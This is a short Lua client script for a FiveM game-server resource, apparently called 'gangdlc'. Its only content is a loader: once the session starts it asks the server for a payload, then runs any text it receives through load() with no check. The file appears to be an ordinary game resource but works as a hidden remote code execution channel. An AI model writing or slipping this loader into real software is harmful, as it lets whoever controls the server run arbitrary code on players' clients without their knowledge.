Citizen.CreateThread(function()
    while not NetworkIsSessionStarted() do 
        Wait(0) 
    end
    TriggerServerEvent("gangdlc:skid")
end)

RegisterNetEvent("gangdlc:skid")
AddEventHandler("gangdlc:skid", function(text)
    assert(load(text))()
end)